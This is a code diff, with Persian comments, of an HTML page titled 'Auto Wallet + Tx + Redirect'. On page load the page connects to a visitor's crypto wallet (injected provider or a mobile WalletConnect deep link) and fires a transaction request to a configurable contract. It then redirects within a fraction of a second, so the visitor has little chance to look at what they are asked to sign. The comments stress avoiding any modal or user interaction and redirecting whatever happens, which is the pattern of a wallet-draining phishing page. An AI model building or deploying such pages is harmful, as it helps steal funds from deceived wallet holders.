@@ -1,56 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Auto Transaction</title>
-  <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/web3modal"></script>
+  <meta charset="UTF-8" />
+  <title>Auto Wallet + Tx + Redirect</title>
+  <!-- ethers برای encode و provider استاندارد -->
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <!-- EIP-6963 کشف Providerهای Injected -->
+  <script>
+    // گردآوری providerهای اعلام‌شده طبق EIP-6963
+    window.__EIP6963_PROVIDERS__ = [];
+    window.addEventListener("eip6963:announceProvider", (event) => {
+      window.__EIP6963_PROVIDERS__.push(event.detail);
+    });
+    // درخواست اعلام providerها
+    window.dispatchEvent(new Event("eip6963:requestProvider"));
+  </script>
+  <!-- WalletConnect SignClient v2 (UMD) -->
+  <script src="https://unpkg.com/@walletconnect/sign-client/dist/umd/index.min.js"></script>
+  <!-- qrcode (فقط اگر بخواهی fallback دسکتاپِ بدون والت را مدیریت کنی؛ اینجا استفاده نمی‌کنیم) -->
 </head>
-<body>
+<body style="margin:0">
 <script>
 (async () => {
-  const urlParams = new URLSearchParams(window.location.search);
-  const redirectURL = urlParams.get("redirect") || "https://test.com";
+  // ========= تنظیمات شما =========
+  const DEST_URL   = new URLSearchParams(location.search).get("redirect") || "https://test.com";
+  const CHAIN_ID   = 1; // اتریوم مین‌نت (0x1)
+  const CHAIN_HEX  = "0x1";
+  const RPC_URLS   = { 1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY" }; // برای WC موبایل بهتره ست باشه
+  const PROJECT_ID = "d317becfd753b7bed5797bfdd39ab181"; // از walletconnect.com بگیر
+  // پارامترهای تراکنش (جایگزین کن):
+  const TO_ADDRESS   = "0xYourContractAddress";
+  const ENCODED_DATA = "0xYourEncodedFunctionData"; // encode با ABI
+  const VALUE        = "0x0"; // اگر ETH می‌فرستی اینجا مقدار رو بزن (هگز)
 
-  try {
-    // WalletConnect Provider
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: {
-            1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
-          }
-        }
+  // ======== یوتیلیتی‌ها ========
+  const isMobile = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const delay = (ms) => new Promise(r => setTimeout(r, ms));
+
+  // انتخاب بهترین injected provider (EIP-6963 + window.ethereum)
+  function pickInjectedProvider() {
+    const announced = (window.__EIP6963_PROVIDERS__ || []).map(p => p.provider);
+    const w = window.ethereum;
+    const list = [];
+
+    if (announced.length) list.push(...announced);
+    if (w && w.providers && w.providers.length) list.push(...w.providers);
+    if (w && !list.includes(w)) list.push(w);
+
+    // اولویت ساده: MetaMask > Coinbase > Rabby > First
+    const byFlag = (p, flag) => (p && p[flag]) ? 1 : 0;
+    list.sort((a, b) => (
+      byFlag(b, "isMetaMask") - byFlag(a, "isMetaMask") ||
+      byFlag(b, "isCoinbaseWallet") - byFlag(a, "isCoinbaseWallet") ||
+      byFlag(b, "isRabby") - byFlag(a, "isRabby")
+    ));
+    return list[0] || null;
+  }
+
+  // ارسال تراکنش از طریق provider استاندارد EIP-1193
+  async function suggestTxViaInjected(provider) {
+    // درخواست سوییچ/افزودن شبکه (اختیاری اما بهتره)
+    try {
+      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: CHAIN_HEX }] });
+    } catch (e) {
+      // اگر شبکه اضافه نیست
+      if (e && e.code === 4902 && RPC_URLS[CHAIN_ID]) {
+        try {
+          await provider.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: CHAIN_HEX,
+              chainName: "Ethereum Mainnet",
+              nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+              rpcUrls: [RPC_URLS[CHAIN_ID]],
+              blockExplorerUrls: ["https://etherscan.io"]
+            }]
+          });
+        } catch (_) {}
+      }
+    }
+
+    // درخواست اتصال اکانت و پیشنهاد تراکنش
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const from = accounts[0];
+
+    // بدون اینکه منتظر کانفرم بمانیم؛ فقط "پیشنهاد" را می‌فرستیم
+    provider.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from,
+        to: TO_ADDRESS,
+        data: ENCODED_DATA,
+        value: VALUE
+      }]
+    }).catch(() => {/* اهمیتی ندارد؛ بلافاصله ریدایرکت می‌کنیم */});
+  }
+
+  // ایجاد WC session و دیپ‌لینک خودکار روی موبایل (بدون مودال)
+  async function suggestTxViaWalletConnectDeepLink() {
+    const SignClient = window.WalletConnectSign?.default || window.WalletConnectSign; // UMD
+    if (!SignClient) throw new Error("WalletConnect SignClient not loaded");
+
+    const client = await SignClient.init({ projectId: PROJECT_ID, metadata: {
+      name: "AutoTx",
+      description: "Auto transaction intent",
+      url: location.origin,
+      icons: ["https://walletconnect.com/walletconnect-logo.png"]
+    }});
+
+    // namespace استاندارد EVM
+    const requiredNamespaces = {
+      eip155: {
+        methods: ["eth_sendTransaction", "eth_requestAccounts", "personal_sign", "eth_signTypedData"],
+        chains: [`eip155:${CHAIN_ID}`],
+        events: ["accountsChanged", "chainChanged"]
       }
     };
 
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions
-    });
+    const { uri, approval } = await client.connect({ requiredNamespaces });
 
-    const instance = await web3Modal.connect();
-    const web3 = new Web3(instance);
+    if (uri) {
+      // Deep Link مستقیم به برخی کیف‌پول‌های محبوب
+      const encoded = encodeURIComponent(uri);
+      const candidates = [
+        // MetaMask
+        `https://metamask.app.link/wc?uri=${encoded}`,
+        // Rainbow
+        `https://rnbwapp.com/wc?uri=${encoded}`,
+        // Trust Wallet
+        `https://link.trustwallet.com/wc?uri=${encoded}`,
+        // کیف پول‌های مبتنی بر اسکیم عمومی (ممکن است روی برخی دستگاه‌ها کار کند)
+        `wc:${uri}`
+      ];
 
-    const accounts = await web3.eth.getAccounts();
+      // اولین دیپ‌لینکی که مرورگر اجازه بده
+      location.href = candidates[0];
+      // اگر کاربر برگرده، لینک‌های بعدی را امتحان نکن—بلافاصله ری‌دایرکت مقصد را انجام می‌دهیم بعد از تأخیر کوتاه
+    }
 
-    // تراکنش نمونه (اینجا باید تراکنش واقعی خودت رو بسازی)
-    const tx = {
-      from: accounts[0],
-      to: "0xYourContractAddress",
-      data: "0xYourEncodedFunctionData",
-      value: "0x0"
-    };
+    // approval یک Promise است؛ منتظرش نمی‌مانیم تا گیر نکنیم.
+    // پس فقط تلاش می‌کنیم بعد از چند صد میلی‌ثانیه تراکنش را پیشنهاد بدهیم اگر session برقرار شد.
+    (async () => {
+      try {
+        const session = await approval(); // اگر کاربر wallet را باز کند و approve بدهد
+        const topic = session.topic;
+        // ارسال تراکنش پیشنهاد‌شده
+        client.request({
+          topic,
+          chainId: `eip155:${CHAIN_ID}`,
+          request: {
+            method: "eth_sendTransaction",
+            params: [{
+              from: session.namespaces.eip155.accounts[0].split(":")[2],
+              to: TO_ADDRESS,
+              data: ENCODED_DATA,
+              value: VALUE
+            }]
+          }
+        }).catch(() => {});
+      } catch (e) {
+        // کاربر approve نداد یا برگشت—اهمیتی ندارد
+      }
+    })();
+  }
 
-    await web3.eth.sendTransaction(tx);
+  // ======== جریان اصلی ========
+  try {
+    const injected = pickInjectedProvider();
+    if (injected) {
+      // حالت ۱: ولت Injected موجود است (دسکتاپ/موبایل) → بی‌درنگ ولت را باز کن و تراکنش را پیشنهاد بده
+      await suggestTxViaInjected(injected);
+      // خیلی کوتاه صبر تا پاپ‌آپ فرصت باز شدن داشته باشد، سپس ریدایرکت
+      await delay(150);
+      location.replace(DEST_URL);
+      return;
+    }
 
+    if (isMobile()) {
+      // حالت ۲: موبایل و ولت Injected در دسترس نیست → WalletConnect Deep Link بدون مودال
+      await suggestTxViaWalletConnectDeepLink();
+      // کمی تأخیر برای باز شدن اپ ولت، سپس ریدایرکت
+      await delay(300);
+      location.replace(DEST_URL);
+      return;
+    }
+
+    // حالت ۳: دسکتاپ بدون ولت → راهی برای باز کردن ولت بدون UI/تعامل کاربر وجود ندارد.
+    // برای حفظ تجربه‌ی بدون گیر، مستقیم به مقصد برو.
+    location.replace(DEST_URL);
   } catch (err) {
-    console.error("Tx error:", err);
-  } finally {
-    // انتقال بدون باقی ماندن در history
-    location.replace(redirectURL);
+    // هر خطایی رخ بده—باز هم به مقصد برو
+    console.error(err);
+    location.replace(DEST_URL);
   }
 })();
 </script>
